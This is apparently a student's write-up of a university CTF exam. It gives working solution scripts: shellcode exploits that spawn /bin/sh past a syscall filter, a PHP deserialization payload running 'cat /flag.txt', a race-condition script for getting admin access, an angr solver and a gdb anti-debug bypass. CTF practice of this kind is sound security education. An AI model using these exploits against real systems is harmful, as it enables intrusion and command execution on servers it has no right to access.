# Advanced Cybersecurity Topics CTF exam 2020/2021
## syscall
![c](https://img.shields.io/badge/shellcode-red) ![p](https://img.shields.io/badge/Points-204-success)
```python
from pwn import *

context.terminal = ['terminator', '-e']

# Connect to the server 
r = remote("actf.jinblack.it", 4001)

# Classic shellcode with buffer overflow
# Main problem: the code checks if we insert 0f and a 05 right after it (syscall instruction blocked)
# Idea: save a similar value (in this case 0f05 - 1) and then compute it back

'''
SHELLCODE - simply follow the parameters passing in the registers
mov rax, 0x3b		; syscall value for execve
mov rdi, 0x404080	; pointer to /bin/sh
xor rsi, rsi 		; set rsi to 0
xor rdx, rdx 		; set rdx to 0
mov rbx, 0x050e 	; use a register to store the syscall values (\x0f\x05) - 1 to bypass the check
add rbx, 1 			; now add 1 to get the actual bytes
mov [rip], rbx 		; and modify the value pointed by rip in order to trigger the syscall execution
'''

# /bin/sh will be at the start of the buffer, so at 0x404080
# so the address where we want to jump is 8 bytes after this 
target_addr = 0x404088

shellcode = b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\x80\x40\x40\x00\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC3\x0E\x05\x00\x00\x48\x83\xC3\x01\x48\x89\x1D\x00\x00\x00\x00"

# Send payload and overwrite RIP with the target address
payload = (b"/bin/sh\x00" + shellcode).ljust(216, b"\x90") + p64(target_addr)

# Adjust again
payload = payload.ljust(1000, b"\x90")

r.send(payload)
r.interactive()
```

**flag{nice_job!_self_modifying_shellcode?}**

## syscaslr
![c](https://img.shields.io/badge/shellcode-red) ![p](https://img.shields.io/badge/Points-204-success)
```python
from pwn import *

context.terminal = ['terminator', '-e']

# Connect to the server
r = remote("actf.jinblack.it", 4002)

# Main problem: the code checks if we insert a 0f or a 05 (syscall instruction blocked), also this time we don't know the buffer address
# Idea: save a similar value (in this case 0x0f05 - 0x0101) and then compute it back, while storing the /bin/sh string in the stack 
# Basically is the same idea of the previous challenge, with a modification of the check bypass
# Actually we don't care about the address of the buffer, because what we insert will be executed as it is.
# The first idea was to use the initial value in rax (the start of the shellcode) to bypass the randomization, but it wasn't necessary.

# First part of the shellcode, classic execve shellcode 
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99"

# Second part of the shellcode, substitute \x0f\x05 with the registers operations written here
# mov rbx, 0x040e
# add rbx, 0x0101
# mov [rip], rbx

shellcode = shellcode + b"\x48\xC7\xC3\x0E\x04\x00\x00\x48\x81\xC3\x01\x01\x00\x00\x48\x89\x1D\x00\x00\x00\x00" 

# Send payload
payload = shellcode.ljust(1000, b"\x90")

r.send(shellcode)
r.interactive()
```

**flag{nice_job!_self_modifying_shellcode?getting_address_wiht_call?}**

## cracksymb
![c](https://img.shields.io/badge/symbolic-blue) ![p](https://img.shields.io/badge/Points-204-success)
```python
import angr
import claripy

# From Ghidra we can see that the max length is 0x17 so 23 in decimal
# also, in the check_flag function we can see that checks input[0x16]
# it's reasonable to think that the last char is at 0x16 or 0x17, so 
# we can try with both of them
# Actually the real length seems to be 23, because the output of angr 
# has a random symbol after the '}', but hey I got the flag.
FLAG_LENGTH = 24

# Attach the script to the executable
p = angr.Project("./cracksymb") 

# Just create the symbolic var representing the input
# create 24 BVS of size 8 bit = 1 byte = 1 char
# so those are all symbolic bitvectors that represent all the pwd characters
# and concat all
pwd_chars = [claripy.BVS(f"pwd_chars{i}", 8) for i in range(FLAG_LENGTH)]	

# now just concat the endline char to actually send the input
pwd = claripy.Concat( *pwd_chars + [claripy.BVV(b"\n")])

# Create a state
state = p.factory.full_init_state(
        args = ['./cracksymb'],
        add_options = {angr.options.LAZY_SOLVES}, # Hint
        stdin = pwd,
)

# Make sure that these characters are printable, start from ! to ~
for k in pwd_chars:
    state.solver.add(k >= ord('!'))
    state.solver.add(k <= ord('~'))

# Create a sim manager from the state
simgr = p.factory.simulation_manager(state)
find_addr  = 0x04033c2 # from Ghidra
avoid_addr = 0x04033d0 # from Ghidra 


# and make him go until our goal address, avoiding the bad one
simgr.explore(find = find_addr, avoid = avoid_addr)

# if the sim manager reached the address just print the needed characters 
if (len(simgr.found) > 0):
    for found in simgr.found:
        print(found.posix.dumps(0))
```

**flag{l1n34r_syst3ms_<3}**

## metactf
![c](https://img.shields.io/badge/serialization-orange) ![p](https://img.shields.io/badge/Points-204-success)

By looking at the source code and searching for unserialize/serialize calls we can see the two files download_user.php and upload_user.php
We also know that the flag will be in `/flag.txt` so we can search for a path in al the Classes, but no luck.
Instead, we can see that in data.php we have the Challenges class (marked as WIP, also more interesting), where we have 2 magic methods construct and destruct.
By looking at the code, the most promising looks destruct, because it calls stop() and so it will trigger an `exec($this->stop_cmd, $output, $retval);` and then `echo($output[0]);`
Idea: craft a serialized Challenge object, that will not result in an error because the class actually exists, and put a nice command in the stop command.

With php we can to this:
```php
    $data= new Challenge("A","B");
    $sData = serialize($data);
    echo $sData;
```
so that now we automatically have a serialized Challenge object: `O:9:"Challenge":4:{s:4:"name";s:1:"A";s:11:"description";s:1:"B";s:9:"setup_cmd";N;s:8:"stop_cmd";N;}`

Notice that for now the commands are set to N = null, but if we put *cat /flag.txt* it should work.

Final object uploaded to the website:
`O:9:"Challenge":4:{s:4:"name";s:1:"A";s:11:"description";s:1:"B";s:9:"setup_cmd";N;s:8:"stop_cmd";s:13:"cat /flag.txt";}`

**flag{nice_yuo_got_the_unserialize_flag!}**

## metarace
![c](https://img.shields.io/badge/race-yellow) ![p](https://img.shields.io/badge/Points-204-success)
```python
import requests
import string
import random
import sys
import threading
import time

# From the sourcecode we can see that the user is created, and only after that is set to not an admin. Also, only the admin can access to all the challenges. 
# We can try to exploit this and win the race condition with the right request, requesting the challenges before the fixUser() function is called.
# First of all we register a new account, the login and request the index page (so the challenges).
# Eventually we will win the race condition for an account, and if yes, we print the response: in this way 
# we access as admin the index page, so we are shown ALL the challenges, and not only the enabled ones.

# This script is higly based on the one written in class, but with some crucial modifications. 

# All links
reg_url = 'http://actf.jinblack.it:4007/register.php'
log_url = 'http://actf.jinblack.it:4007/login.php'
index_url = 'http://actf.jinblack.it:4007/index.php'

# Generate random strings for username and pwd
def rand_string(N=10):
	return ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))

# Registration request
def register(u,p1,p2):
	# by looking at the network we see this useless parameter reg_user 
	data = {"username":u, "password_1": p1, "password_2": p2, "reg_user": ""}
	r = requests.post(reg_url, data = data)

	if "Registration Completed!" in r.text:
		return True
	return False

# Login and Challenges request
def login(u, p):
	with requests.Session() as s:
		# by looking at the network we see this useless parameter log_user 
		data = {"username":u, "password": p, "log_user": ""}
		r = s.post(log_url, data = data)

		if "Login Completed!" in r.text:
			x2 = s.get(index_url)
	
			if "flag{" in x2.text:
				print(x2.text)
				sys.exit(0)


# Just try to win the race
while True:
	u = rand_string()
	p = rand_string()

	r = threading.Thread(target=register, args=(u, p, p))
	r.start()

	l = threading.Thread(target=login, args=(u, p))
	l.start()

	time.sleep(0.1)
```

**flag{this_is_the_race_condition_flag}**

## crackme
![c](https://img.shields.io/badge/reversing-green) ![p](https://img.shields.io/badge/Points-204-success)

Let's just run this in gdb, and set a simple breakpoint in the main with `b main`.
Let's see what the program does, because Ghidra tells us nothing for now. (`x /100i $rip`) 

```assembly
=> 0x555555554866 <main+4>:		sub    rsp,0x10
   0x55555555486a <main+8>:		mov    DWORD PTR [rbp-0x4],edi
   0x55555555486d <main+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x555555554871 <main+15>:	lea    rsi,[rip+0xfffffffffffffee2]        # 0x55555555475a <catch_function>
   0x555555554878 <main+22>:	mov    edi,0x5
   0x55555555487d <main+27>:	call   0x555555554620 <signal@plt>
   0x555555554882 <main+32>:	cmp    DWORD PTR [rbp-0x4],0x1
   0x555555554886 <main+36>:	jg     0x55555555489b <main+57>
   0x555555554888 <main+38>:	lea    rdi,[rip+0x107]        # 0x555555554996
   0x55555555488f <main+45>:	call   0x555555554600 <puts@plt>
   0x555555554894 <main+50>:	mov    eax,0x1
   0x555555554899 <main+55>:	jmp    0x5555555548bc <main+90>
   0x55555555489b <main+57>:	mov    rax,QWORD PTR [rbp-0x10]
   0x55555555489f <main+61>:	mov    rax,QWORD PTR [rax+0x8]
   0x5555555548a3 <main+65>:	mov    QWORD PTR [rip+0x200776],rax        # 0x555555755020 <input>
   0x5555555548aa <main+72>:	int3   
   0x5555555548ab <main+73>:	lea    rdi,[rip+0xfb]        # 0x5555555549ad
   0x5555555548b2 <main+80>:	call   0x555555554600 <puts@plt>
   0x5555555548b7 <main+85>:	mov    eax,0x0
   0x5555555548bc <main+90>:	leave  
   0x5555555548bd <main+91>:	ret   
```

We can try to bypass the antirev with signal with gdb, by manipulating the handling of these signals. In particular, we can see that there is an `int3` instruction that gdb will use as his breakpoint, so we won't see anything.
The idea now is: get to `0x5555555548aa` (int3), and write the command `handle SIGTRAP pass` to not ignore the signal and enter in the catch_function
Now we can remove it with `handle SIGTRAP nopass`, to be able to set our breakpoints as we want.
From a rapid analysis with Ghidra we can see that the program does a XOR of every character of the input with a global array called key1, and compares them with another global variable (that we can see from Ghidra)

Let's analyze the following code, searching for a xor operation.
At address `0x5555555547dc` there is `xor    ecx, eax`, and by looking at the registers value we can notice that in ecx is stored the first input charachter and in eax there is (hopefully) key1.
A jump is then taken later if everything goes well, so we can use this as a double check of our input.

` ► 0x5555555547f0 <catch_function+150>  ✔ je     catch_function+159 <catch_function+159>`

For every char, the check is exactly: input[i] ^ key1[i] == ghidra_array[i]
Let's make an example for the first one, we see that rax = 0x19 = key1[0], and ghidra_array[0] = 0x7f
So input[0] = key1[0] ^ ghidra_array[0] = 0x19 ^ 0x7f = 0x66 = 'f'
Wow, that looks promising as "flag{.."

With just some trial and errors and a lot of patience we can retrieve every needed character, resulting in the final flag (yes, a better solution exists for sure).

**flag{l0v3ly_4nt1r3v_tr1ck5_w_s1gn4l5}**
